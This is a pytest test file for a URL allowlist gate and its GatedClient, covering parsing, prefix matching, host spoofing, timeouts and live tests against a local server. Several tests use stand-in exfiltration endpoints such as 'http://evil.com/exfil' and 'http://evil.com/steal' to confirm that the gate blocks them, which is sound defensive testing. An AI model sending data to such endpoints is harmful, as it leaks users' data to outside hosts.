"""Tests for shared/url_gate.py — URL allowlist and GatedClient."""

import json
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

import pytest

from shared.url_gate import (
    URLNotAllowedError,
    GatedClient,
    check_url,
    extract_hosts,
    parse_allowed_urls,
)


# ── parse_allowed_urls ─────────────────────────────────────────────

class TestParseAllowedUrls:
    def test_empty(self):
        assert parse_allowed_urls("") == []

    def test_csv(self):
        result = parse_allowed_urls("http://a.com, http://b.com")
        assert result == ["http://a.com/", "http://b.com/"]

    def test_json(self):
        raw = json.dumps(["http://a.com", "http://b.com"])
        result = parse_allowed_urls(raw)
        assert result == ["http://a.com/", "http://b.com/"]

    def test_trailing_slash_normalised(self):
        result = parse_allowed_urls("http://a.com/")
        assert result == ["http://a.com/"]

    def test_no_trailing_slash_added(self):
        result = parse_allowed_urls("http://a.com")
        assert result == ["http://a.com/"]


# ── check_url ──────────────────────────────────────────────────────

class TestCheckUrl:
    def test_allowed(self):
        assert check_url("http://a.com/foo", ["http://a.com/"])

    def test_blocked(self):
        assert not check_url("http://evil.com/foo", ["http://a.com/"])

    def test_prefix_match(self):
        assert check_url("http://a.com/experiments/recent", ["http://a.com/"])

    def test_no_partial_host_match(self):
        # "http://a.com.evil.com/" should NOT match "http://a.com/"
        assert not check_url("http://a.com.evil.com/foo", ["http://a.com/"])

    def test_empty_allowlist(self):
        assert not check_url("http://a.com/foo", [])

    def test_presigned_url(self):
        presigned = "https://r2.example.com/bucket/key?X-Amz-Signature=abc123"
        assert check_url(presigned, ["https://r2.example.com/"])


# ── extract_hosts ──────────────────────────────────────────────────

class TestExtractHosts:
    def test_basic(self):
        hosts = extract_hosts(["http://localhost:8080/", "https://r2.example.com/"])
        assert "localhost:8080" in hosts
        assert "r2.example.com" in hosts

    def test_dedup(self):
        hosts = extract_hosts(["http://a.com/", "http://a.com/foo/"])
        assert hosts == ["a.com"]

    def test_with_port(self):
        hosts = extract_hosts(["http://10.0.0.1:8080/"])
        assert hosts == ["10.0.0.1:8080"]


# ── GatedClient ────────────────────────────────────────────────────

class TestGatedClient:
    def test_get_blocked(self):
        client = GatedClient(["http://allowed.com/"])
        with pytest.raises(URLNotAllowedError):
            client.get("http://evil.com/steal")

    def test_post_blocked(self):
        client = GatedClient(["http://allowed.com/"])
        with pytest.raises(URLNotAllowedError):
            client.post("http://evil.com/exfil", b"data")

    def test_put_blocked(self):
        client = GatedClient(["http://allowed.com/"])
        with pytest.raises(URLNotAllowedError):
            client.put("http://evil.com/upload", b"data")

    def test_llm_timeout_longer(self):
        client = GatedClient(["http://proxy.test/"], timeout=15, llm_timeout=90)
        assert client._effective_timeout("http://proxy.test/experiments/recent", None) == 15
        assert client._effective_timeout("http://proxy.test/llm/v1/chat/completions", None) == 90
        assert client._effective_timeout("http://proxy.test/llm/models", None) == 90
        # Explicit timeout overrides both
        assert client._effective_timeout("http://proxy.test/llm/v1/chat/completions", 60) == 60

    def test_llm_timeout_default(self):
        client = GatedClient(["http://proxy.test/"])
        assert client._effective_timeout("http://proxy.test/llm/chat", None) == 30
        assert client._effective_timeout("http://proxy.test/other", None) == 10

    def test_max_retries_default(self):
        client = GatedClient(["http://proxy.test/"])
        assert client._max_retries == 1
        assert client._retries_for_url("http://proxy.test/experiments") == 1
        assert client._retries_for_url("http://proxy.test/llm/chat") == 0


class _OKHandler(BaseHTTPRequestHandler):
    """Minimal handler that returns 200 with a JSON body."""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"ok": True}).encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"received": len(body)}).encode())

    def do_PUT(self):
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass  # suppress logs


@pytest.fixture()
def local_server():
    """Spin up a throwaway HTTP server on localhost."""
    server = HTTPServer(("127.0.0.1", 0), _OKHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{port}"
    server.shutdown()


class TestGatedClientLive:
    def test_get_allowed(self, local_server):
        client = GatedClient([f"{local_server}/"])
        result = client.get_json(f"{local_server}/foo")
        assert result == {"ok": True}

    def test_post_allowed(self, local_server):
        client = GatedClient([f"{local_server}/"])
        result = client.post_json(f"{local_server}/bar", {"key": "val"})
        assert "received" in result

    def test_put_allowed(self, local_server):
        client = GatedClient([f"{local_server}/"])
        status = client.put(f"{local_server}/upload", b"hello")
        assert status == 200

    def test_mixed_allowed_and_blocked(self, local_server):
        client = GatedClient([f"{local_server}/"])
        # Allowed
        assert client.get_json(f"{local_server}/ok") == {"ok": True}
        # Blocked
        with pytest.raises(URLNotAllowedError):
            client.get("http://evil.com/steal")
